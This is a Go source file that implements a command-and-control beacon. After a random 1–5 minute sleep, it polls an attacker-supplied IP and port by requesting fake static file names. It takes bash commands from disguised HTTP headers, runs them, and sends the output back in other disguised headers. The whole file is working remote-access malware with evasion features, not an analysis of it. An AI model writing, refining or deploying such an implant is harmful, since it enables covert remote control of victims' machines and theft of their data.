package main

import (
	"bytes"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"time"
)

// generateRandomFilename creates a random filename with extension
func generateRandomFilename() string {
	extensions := []string{
		"jpg", "png", "gif", "pdf", "doc", "xls", "txt", "html", "css", "js",
		"zip", "rar", "mp3", "mp4", "avi", "mov", "json", "xml", "csv", "svg",
	}

	nameLength := rand.Intn(9) + 8
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	name := make([]byte, nameLength)
	for i := range name {
		name[i] = chars[rand.Intn(len(chars))]
	}

	extension := extensions[rand.Intn(len(extensions))]

	return fmt.Sprintf("%s.%s", string(name), extension)
}

// executeCommand runs the given bash command and returns its output
func executeCommand(command string) (string, error) {
	cmd := exec.Command("bash", "-c", command)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()

	if err != nil {
		return "", fmt.Errorf("command execution error: %v, stderr: %s", err, stderr.String())
	}

	return out.String(), nil
}

const (
	ID_HEADER          = "Context-Verification"
	FINGERPRINT_HEADER = "Transfer-Context"
	COMMAND_HEADER     = "Cache-Cache-Protocol"
	RESULT_HEADER      = "X-Resource-Priority"
)

func main() {
	fingerprint := os.Args[1]
	ip := os.Args[2]
	port := os.Args[3]

	rand.Seed(time.Now().UnixNano())

	for {
		// Random sleep time between 1 and 5 minutes
		sleepTime := time.Duration(rand.Intn(4*60)+60) * time.Second
		time.Sleep(sleepTime)

		// Generate a random filename
		filename := generateRandomFilename()
		url := fmt.Sprintf("http://%s:%s/static/%s", ip, port, filename)

		// Create HTTP request
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			continue
		}

		req.Header.Set(FINGERPRINT_HEADER, fingerprint)

		// Make the HTTP request
		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		// Check for command
		command := resp.Header.Get(COMMAND_HEADER)
		if command == "" {
			continue
		}

		id := resp.Header.Get(ID_HEADER)
		if id == "" {
			continue
		}
		
		// Execute the decoded bash command
		cmdOutput, err := executeCommand(command)
		if err != nil {
			continue
		}
		
		// Set up the follow-up request
		followupReq, err := http.NewRequest("GET", url, nil)
		if err != nil {
			continue
		}

		followupReq.Header.Set(RESULT_HEADER, cmdOutput)
		followupReq.Header.Set(ID_HEADER, id)
		followupReq.Header.Set(FINGERPRINT_HEADER, fingerprint)
		
		// Send the follow-up request
		client.Do(followupReq)

		resp.Body.Close()

	}
}